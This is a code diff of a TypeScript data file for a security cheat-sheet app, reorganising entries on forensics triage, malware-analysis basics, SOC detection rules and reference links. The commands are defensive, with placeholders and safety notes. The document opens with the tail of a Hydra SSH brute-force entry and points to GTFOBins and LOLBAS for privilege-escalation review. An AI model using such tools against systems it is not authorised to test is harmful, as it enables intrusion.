+        notes: 'Online tests are noisy and may trigger lockouts or alerts. Confirm written authorization first.',
+        tags: ['hydra', 'ssh', 'online']
+      }
     ]
   },
   {
-    id: 'forensics-quick',
-    title: 'Forensics Quick Commands',
     category: 'Forensics',
-    description: 'Fast triage commands for files, metadata, strings, memory, and timelines.',
-    icon: 'search',
-    tags: ['strings', 'exiftool', 'volatility', 'timeline', 'triage'],
-    commands: [
-      { label: 'File type', code: 'file sample.bin', copy: true },
-      { label: 'Strings', code: 'strings -a sample.bin | less', copy: true },
-      { label: 'Metadata', code: 'exiftool evidence.jpg', copy: true },
-      { label: 'Hashes', code: 'sha256sum evidence.*', copy: true },
-      { label: 'Volatility placeholder', code: 'volatility3 -f memory.raw windows.info', copy: true }
-    ],
-    notes: [
-      'Work from a copy, not original evidence.',
-      'Keep timestamps, timezone, and hash values attached to each artifact.',
-      'Build a timeline before jumping to conclusions.'
+    slug: 'forensics',
+    summary: 'Evidence triage commands for files, strings, metadata, hashes, and memory images.',
+    entries: [
+      {
+        title: 'Identify file type',
+        command: 'file <artifact>',
+        language: 'bash',
+        description: 'Inspects file signatures and metadata to guess the artifact type.',
+        whenToUse: 'Use first when an extension is missing, misleading, or untrusted.',
+        notes: 'Work from a copy of evidence and preserve the original artifact unchanged.',
+        tags: ['file', 'triage', 'evidence']
+      },
+      {
+        title: 'Extract printable strings',
+        command: 'strings -a -n 6 <artifact> | less',
+        language: 'bash',
+        description: 'Shows printable strings of length six or more from a file.',
+        whenToUse: 'Use to quickly spot paths, URLs, commands, user agents, or embedded messages.',
+        notes: 'Strings are clues, not conclusions. Correlate them with other evidence.',
+        tags: ['strings', 'triage', 'forensics']
+      },
+      {
+        title: 'Metadata review',
+        command: 'exiftool <artifact>',
+        language: 'bash',
+        description: 'Displays embedded metadata from images, documents, and other supported files.',
+        whenToUse: 'Use when timestamps, author fields, software names, or GPS fields may matter.',
+        notes: 'Metadata can be modified. Keep timezone assumptions explicit.',
+        tags: ['metadata', 'exiftool', 'evidence']
+      },
+      {
+        title: 'Memory image overview',
+        command: 'volatility3 -f <memory-image> windows.info',
+        language: 'bash',
+        description: 'Runs a basic Volatility 3 plugin to identify Windows memory image details.',
+        whenToUse: 'Use before selecting OS-specific memory forensics plugins.',
+        notes: 'Large memory images can be slow. Record plugin versions for repeatability.',
+        tags: ['memory', 'volatility', 'windows']
+      }
     ]
   },
   {
-    id: 'malware-analysis',
-    title: 'Malware Analysis Flow',
-    category: 'Malware Analysis',
-    description: 'Static-first workflow for safe lab analysis and behavior mapping.',
-    icon: 'flask',
-    tags: ['static', 'dynamic', 'yara', 'mitre', 'sandbox'],
-    warning: 'Analyze only in an isolated malware lab with no shared clipboard or mounted personal folders.',
-    commands: [
-      { label: 'Hashes', code: 'sha256sum sample.bin && md5sum sample.bin', copy: true },
-      { label: 'Static strings', code: 'strings -a -n 6 sample.bin | tee strings.txt', copy: true },
-      { label: 'PE headers placeholder', code: 'pefile sample.exe', copy: true },
-      { label: 'YARA scan placeholder', code: 'yara -r rules.yar sample-directory/', copy: true }
-    ],
-    notes: [
-      'Flow: static review, controlled dynamic run, behavior notes, MITRE mapping, detection ideas.',
-      'Never run unknown samples on your host OS.',
-      'Document network indicators without beaconing to real infrastructure.'
+    category: 'Malware Analysis Basics',
+    slug: 'malware-analysis-basics',
+    summary: 'Static-first analysis steps for isolated malware labs and defensive learning.',
+    entries: [
+      {
+        title: 'Sample hashing',
+        command: 'sha256sum <sample> && md5sum <sample>',
+        language: 'bash',
+        description: 'Calculates SHA-256 and MD5 hashes for a sample.',
+        whenToUse: 'Use before analysis to create stable identifiers for reports and lab notes.',
+        notes: 'Never upload sensitive client samples to public scanners without permission.',
+        tags: ['hashes', 'sample', 'triage']
+      },
+      {
+        title: 'Static strings capture',
+        command: 'strings -a -n 6 <sample> | tee strings.txt',
+        language: 'bash',
+        description: 'Extracts printable strings and saves a copy for review.',
+        whenToUse: 'Use during static triage to identify paths, imports, URLs, mutex names, or commands.',
+        notes: 'Do not execute unknown samples on your host OS.',
+        tags: ['strings', 'static', 'malware']
+      },
+      {
+        title: 'YARA rule skeleton',
+        command: 'rule Lab_Sample_Triage {\n  strings:\n    $s1 = "placeholder" ascii wide\n  condition:\n    $s1\n}',
+        language: 'yara',
+        description: 'Provides a minimal YARA structure for matching a known lab string.',
+        whenToUse: 'Use when turning observed static indicators into a simple local detection rule.',
+        notes: 'Replace placeholder strings with validated indicators and test against clean files.',
+        tags: ['yara', 'detection', 'static']
+      },
+      {
+        title: 'Offline YARA scan',
+        command: 'yara -r <rules-file> <sample-directory>/',
+        language: 'bash',
+        description: 'Recursively scans a directory of samples with a YARA rule file.',
+        whenToUse: 'Use in an isolated analysis VM to check sample sets against local rules.',
+        notes: 'Recursive scans can be broad. Keep malware samples inside a dedicated lab folder.',
+        tags: ['yara', 'scan', 'lab']
+      }
     ]
   },
   {
-    id: 'soc-detection',
-    title: 'SOC and Log Analysis',
     category: 'SOC / Detection',
-    description: 'Triage prompts and query placeholders for alert review and detection engineering.',
-    icon: 'shield',
-    tags: ['soc', 'sigma', 'yara', 'ioc', 'timeline', 'triage'],
-    commands: [
-      { label: 'IOC extraction idea', code: 'grep -Eio "([0-9]{1,3}\\.){3}[0-9]{1,3}|[a-f0-9]{64}|https?://[^ ]+" alert.log | sort -u', copy: true },
-      { label: 'Linux auth failures', code: 'grep -i "failed password" /var/log/auth.log | tail -50', copy: true },
-      { label: 'Sigma placeholder', code: 'sigma-cli convert -t splunk rule.yml', copy: true },
-      { label: 'YARA placeholder', code: 'yara -r detection-rules.yar samples/', copy: true }
-    ],
-    notes: [
-      'Triage: validate alert, scope blast radius, extract IOCs, map tactics, contain, preserve evidence.',
-      'Separate observed facts from assumptions.',
-      'Tune detections with known-good activity before broad deployment.'
+    slug: 'soc-detection',
+    summary: 'Alert triage, IOC extraction, and detection rule starting points.',
+    entries: [
+      {
+        title: 'Extract common IOCs',
+        command: 'grep -Eio "([0-9]{1,3}\\.){3}[0-9]{1,3}|[a-f0-9]{64}|https?://[^ ]+" <log-file> | sort -u',
+        language: 'bash',
+        description: 'Pulls rough IP addresses, SHA-256-like hashes, and URLs from a text log.',
+        whenToUse: 'Use for quick triage when reviewing alert text or exported logs.',
+        notes: 'Regex extraction can produce false positives. Validate indicators before blocking.',
+        tags: ['ioc', 'logs', 'triage']
+      },
+      {
+        title: 'Linux failed logins',
+        command: 'grep -i "failed password" /var/log/auth.log | tail -50',
+        language: 'bash',
+        description: 'Shows recent failed SSH password events from a Linux auth log.',
+        whenToUse: 'Use during defensive review of suspected brute-force activity on a lab or owned host.',
+        notes: 'Log paths vary by distribution and logging configuration.',
+        tags: ['ssh', 'linux', 'logs']
+      },
+      {
+        title: 'Sigma rule skeleton',
+        command: 'title: Suspicious Placeholder Event\nlogsource:\n  product: windows\n  category: process_creation\ndetection:\n  selection:\n    Image|endswith: "\\\\placeholder.exe"\n  condition: selection\nlevel: low',
+        language: 'yaml',
+        description: 'Shows a minimal Sigma-style rule structure for a process creation detection idea.',
+        whenToUse: 'Use when converting an observed lab behavior into a portable detection draft.',
+        notes: 'Tune against known-good activity before deploying any detection broadly.',
+        tags: ['sigma', 'yaml', 'detection']
+      },
+      {
+        title: 'Convert Sigma placeholder',
+        command: 'sigma-cli convert -t <backend> <rule-file>',
+        language: 'bash',
+        description: 'Converts a Sigma rule into a backend query format supported by your tooling.',
+        whenToUse: 'Use after writing and validating a Sigma rule draft.',
+        notes: 'Backend mappings differ. Review generated queries before production use.',
+        tags: ['sigma', 'conversion', 'soc']
+      }
     ]
   },
   {
-    id: 'useful-links',
-    title: 'Useful Security References',
     category: 'Useful Links',
-    description: 'High-signal references for daily CTF, lab, and defensive research work.',
-    icon: 'external',
-    tags: ['references', 'docs', 'training', 'databases'],
-    commands: [
-      { label: 'Search syntax', code: 'site:docs.vendor.com PRODUCT VERSION security advisory', copy: true },
-      { label: 'GitHub code search', code: '"PRODUCT" "VERSION" "CVE-YYYY-NNNN"', copy: true }
-    ],
-    notes: [
-      'Use public references for structure, then write your own notes from verified lab evidence.',
-      'Keep links current during report finalization.',
-      'Do not paste massive payload lists into writeups without context.'
-    ],
-    links: [
-      { label: 'OWASP Web Security Testing Guide', href: 'https://owasp.org/www-project-web-security-testing-guide/' },
-      { label: 'MITRE ATT&CK', href: 'https://attack.mitre.org/' },
-      { label: 'GTFOBins', href: 'https://gtfobins.github.io/' },
-      { label: 'LOLBAS', href: 'https://lolbas-project.github.io/' },
-      { label: 'CyberChef', href: 'https://gchq.github.io/CyberChef/' }
+    slug: 'useful-links',
+    summary: 'Reference URLs and search patterns for verification, documentation, and defensive mapping.',
+    entries: [
+      {
+        title: 'OWASP WSTG',
+        command: 'https://owasp.org/www-project-web-security-testing-guide/',
+        language: 'text',
+        description: 'Primary web security testing guide for structured, authorized web assessment methodology.',
+        whenToUse: 'Use when planning web test coverage or checking expected test categories.',
+        notes: 'Use it for methodology. Write your own findings from verified evidence.',
+        tags: ['owasp', 'web', 'methodology']
+      },
+      {
+        title: 'MITRE ATT&CK',
+        command: 'https://attack.mitre.org/',
+        language: 'text',
+        description: 'Knowledge base of adversary tactics, techniques, and procedures used for defensive mapping.',
+        whenToUse: 'Use when mapping observed behavior or detections to ATT&CK techniques.',
+        notes: 'Mapping should describe behavior you observed, not just tool names.',
+        tags: ['mitre', 'attck', 'detection']
+      },
+      {
+        title: 'GTFOBins',
+        command: 'https://gtfobins.github.io/',
+        language: 'text',
+        description: 'Reference for Unix binaries that can be abused in misconfigured privilege contexts.',
+        whenToUse: 'Use during CTF or lab privilege escalation review after finding allowed binaries.',
+        notes: 'Do not paste techniques blindly. Validate the exact permissions and binary version.',
+        tags: ['linux', 'privesc', 'reference']
+      },
+      {
+        title: 'LOLBAS',
+        command: 'https://lolbas-project.github.io/',
+        language: 'text',
+        description: 'Reference for Windows living-off-the-land binaries, scripts, and libraries.',
+        whenToUse: 'Use for defensive detection ideas or authorized Windows lab review.',
+        notes: 'Presence of a binary is normal. Focus on suspicious parent process, arguments, and context.',
+        tags: ['windows', 'lolbas', 'detection']
+      },
+      {
+        title: 'Vendor advisory search',
+        command: 'site:<vendor-docs-domain> <product> <version> security advisory',
+        language: 'text',
+        description: 'Search pattern for finding primary vendor documentation about security fixes.',
+        whenToUse: 'Use before citing vulnerability status, affected versions, or fixed versions.',
+        notes: 'Prefer official advisories over reposted summaries when accuracy matters.',
+        tags: ['advisory', 'research', 'verification']
+      }
     ]
   }
 ];
 
-export const cveResearchLinks: CheatSheetLink[] = [
-  { label: 'NVD', href: 'https://nvd.nist.gov/' },
-  { label: 'MITRE CVE', href: 'https://cve.mitre.org/' },
-  { label: 'Vendor advisories', href: 'https://www.cisa.gov/resources-tools/resources/free-cybersecurity-services-and-tools' },
-  { label: 'GitHub advisory database', href: 'https://github.com/advisories' },
-  { label: 'Exploit-DB', href: 'https://www.exploit-db.com/' },
-  { label: 'CISA KEV', href: 'https://www.cisa.gov/known-exploited-vulnerabilities-catalog' },
-  { label: 'FIRST EPSS', href: 'https://www.first.org/epss/' },
-  { label: 'CVSS calculator', href: 'https://www.first.org/cvss/calculator/3.1' },
-  { label: 'CWE database', href: 'https://cwe.mitre.org/' }
-];
+export const cheatSheets = cheatSheetSections.flatMap((section) =>
+  section.entries.map((entry) => ({
+    ...entry,
+    category: section.category,
+    slug: section.slug
+  }))
+);
